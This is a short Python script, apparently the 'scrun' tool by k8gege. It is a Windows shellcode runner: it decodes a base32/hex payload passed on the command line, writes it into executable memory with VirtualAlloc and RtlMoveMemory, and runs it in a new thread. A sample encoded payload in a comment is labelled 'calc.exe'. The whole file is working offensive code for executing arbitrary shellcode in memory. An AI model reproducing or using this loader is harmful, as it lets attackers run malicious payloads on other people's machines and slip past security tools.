#scrun by k8gege
import ctypes
import sys
import base64
#calc.exe
#IRBEGM2EHE3TIMRUIY2EERKFHA2UCMRXGEZTKRRTGFBTSQRRGMZTGMJXG4YTOOBTIM3TANBQGM4UMNBZIM2UKNSBGM4DMOBQGA4TKQRVG5DDGOBQIJCTMNRSGFDDMQ2CIRBEMNJXIM4TSRBXG5CUIMBQHE3DGRRSIZCDGRKDGRBDSRCCG4YUINJQIZCTIRCEGE2TCMJZHAYUMNCBIYYUCMKEGA4UMRRQIU3DAQZWIZATAQSGGVBEGMRVGVBUEMJZIRDDKNBRIIYTMNKGGJDDCRKFHAYTIOBVGIYTGOBYGQ4TENSBIEYECRKGIQ2ECRBRGYZTCRKCGY4TQMBYIQ2TIQZRIJCDSMRXIFBTEQJSGVCUEOJTHAZUCOCGGVCDIMRTGUZTQMBSIU2TARKFHEZUMNBSIIZTIMJRIU4TQQSCIY4DCQZZGJATCMZVG44TSMRQIQ4DCM2DGUZDIRCGIYYDORBVGA2TIRRXGUYUIMJSIVCEGNZVIJAUMNJXIQZEMNRWGVBDQMJSIZBUKMBUGI3TGQSGIM2TCNJRGY3DMQKBG5CDGMKDIQZUCN2FIIYUKNZTIMYEIQJZGUYUGOJXIUZDORRVHE3DOQJZGIZEGQSFGA3TIQRXGRCTMRBYG43EIOCDHA4DANBYGQ3EGNSGGE2EKRBWHEZEEOJSGFCDAMZSGQ3TOMRSIIYDINJVGI2DCNJXIQ3DGRKBHBDDENKFIE2EENA=
shellcode=bytearray(base64.b32decode(sys.argv[1]).decode("hex"))
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
 
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
 
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
 
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))


